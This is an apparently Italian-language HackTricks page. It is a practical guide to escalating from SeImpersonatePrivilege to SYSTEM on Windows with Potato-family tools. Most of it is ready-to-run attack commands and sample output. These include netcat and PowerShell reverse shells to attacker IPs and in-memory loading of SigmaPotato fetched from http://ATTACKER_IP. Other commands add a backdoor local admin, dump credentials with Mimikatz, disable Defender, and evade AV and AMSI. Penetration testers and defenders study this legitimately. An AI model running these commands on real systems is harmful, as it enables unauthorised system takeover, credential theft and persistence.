# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato non funziona** su Windows Server 2019 e Windows 10 build 1809 in poi. Tuttavia, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** possono essere usati per sfruttare gli stessi privilegi e ottenere accesso a livello `NT AUTHORITY\SYSTEM`. Questo [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) analizza in dettaglio lo strumento `PrintSpoofer`, che può essere utilizzato per abusare dei privilegi di impersonation su host Windows 10 e Server 2019 dove JuicyPotato non funziona più.

> [!TIP]
> Un'alternativa moderna frequentemente mantenuta nel 2024–2025 è SigmaPotato (un fork di GodPotato) che aggiunge l'uso in-memory/.NET reflection e supporto OS esteso. Vedi l'uso rapido sotto e il repo nelle References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisiti e problemi comuni

Tutte le tecniche seguenti si basano sull'abuso di un servizio privilegiato capace di impersonation da un contesto che possiede uno di questi privilegi:

- SeImpersonatePrivilege (il più comune) o SeAssignPrimaryTokenPrivilege
- Non è richiesta integrità elevata se il token ha già SeImpersonatePrivilege (tipico per molti account di servizio come IIS AppPool, MSSQL, ecc.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Note operative:

- Se la tua shell gira con un token ristretto che non ha SeImpersonatePrivilege (comune per Local Service/Network Service in alcuni contesti), recupera i privilegi di default dell’account usando FullPowers, poi esegui una Potato. Esempio: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer richiede che il servizio Print Spooler sia in esecuzione e raggiungibile tramite l'endpoint RPC locale (spoolss). In ambienti con hardening dove lo Spooler è disabilitato dopo PrintNightmare, preferire RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato richiede un OXID resolver raggiungibile su TCP/135. Se l'egress è bloccato, usa un redirector/port-forwarder (see example below). Le build più vecchie richiedevano il flag -f.
- EfsPotato/SharpEfsPotato abusano di MS-EFSR; se una pipe è bloccata, prova pipe alternative (lsarpc, efsrpc, samr, lsass, netlogon).
- L'errore 0x6d3 durante RpcBindingSetAuthInfo indica tipicamente un servizio di autenticazione RPC sconosciuto/non supportato; prova una pipe/transport diversa o assicurati che il servizio di destinazione sia in esecuzione.
- Fork “kitchen-sink” come DeadPotato includono moduli payload aggiuntivi (Mimikatz/SharpHound/Defender off) che toccano il disco; aspettati un rilevamento EDR più alto rispetto agli originali snelli.

## Demo rapida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Note:
- Puoi usare -i per avviare un processo interattivo nella console corrente, o -c per eseguire un one-liner.
- Richiede il servizio Spooler. Se è disabilitato, questo fallirà.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Se outbound 135 è bloccato, pivot the OXID resolver via socat sul tuo redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato è una nuova primitive di abuso COM rilasciata alla fine del 2022 che prende di mira il servizio **PrintNotify** invece di Spooler/BITS. Il binario istanzia il server COM PrintNotify, sostituisce con un `IUnknown` finto, quindi attiva una callback privilegiata tramite `CreatePointerMoniker`. Quando il servizio PrintNotify (in esecuzione come **SYSTEM**) si riconnette, il processo duplica il token restituito e avvia il payload fornito con privilegi completi.

Note operative principali:

* Funziona su Windows 10/11 e Windows Server 2012–2022 purché il servizio Print Workflow/PrintNotify sia installato (è presente anche quando lo Spooler legacy è disabilitato dopo PrintNightmare).
* Richiede che il contesto chiamante possieda **SeImpersonatePrivilege** (tipico per IIS APPPOOL, MSSQL e gli account di servizio di scheduled-task).
* Accetta sia un comando diretto sia una modalità interattiva così puoi restare nella console originale. Esempio:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Poiché è completamente basato su COM, non sono necessari named-pipe listeners o redirector esterni, rendendolo un sostituto immediato su host dove Defender blocca il binding RPC di RoguePotato.

Operatori come Ink Dragon eseguono PrintNotifyPotato immediatamente dopo aver ottenuto ViewState RCE su SharePoint per pivotare dal worker `w3wp.exe` a SYSTEM prima di installare ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Suggerimento: se una pipe fallisce o l'EDR la blocca, prova le altre pipe supportate:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Note:
- Funziona su Windows 8/8.1–11 e Server 2012–2022 quando è presente SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fornisce due varianti che prendono di mira gli oggetti DCOM di servizio che impostano per default RPC_C_IMP_LEVEL_IMPERSONATE. Compila o usa i binari forniti ed esegui il tuo comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork aggiornato di GodPotato)

SigmaPotato aggiunge migliorie moderne, come esecuzione in memoria tramite .NET reflection e un helper per PowerShell reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Vantaggi aggiuntivi nelle build 2024–2025 (v1.2.x):
- Flag integrato per reverse shell `--revshell` e rimozione del limite di 1024 caratteri di PowerShell, così puoi inviare AMSI-bypassing payloads lunghi in un'unica volta.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), più un rudimentale trucco di evasione AV tramite `VirtualAllocExNuma()` per confondere euristiche semplici.
- `SigmaPotatoCore.exe` separato compilato contro .NET 2.0 per ambienti PowerShell Core.

### DeadPotato (rework di GodPotato del 2024 con moduli)

DeadPotato mantiene la catena di impersonificazione OXID/DCOM di GodPotato ma integra helper di post-exploitation, permettendo agli operatori di ottenere immediatamente SYSTEM e svolgere persistence/collection senza tool aggiuntivi.

Moduli comuni (tutti richiedono SeImpersonatePrivilege):

- `-cmd "<cmd>"` — esegue un comando arbitrario come SYSTEM.
- `-rev <ip:port>` — reverse shell rapida.
- `-newadmin user:pass` — crea un admin locale per persistence.
- `-mimi sam|lsa|all` — rilascia ed esegue Mimikatz per dump delle credenziali (scrive su disco, rumoroso).
- `-sharphound` — esegue SharpHound collection come SYSTEM.
- `-defender off` — disattiva la protezione in tempo reale di Defender (molto rumoroso).

Esempi di one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Poiché include binari aggiuntivi, aspettati un maggior numero di rilevamenti AV/EDR; usa le versioni più snelle GodPotato/SigmaPotato quando la stealth conta.

## Riferimenti

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
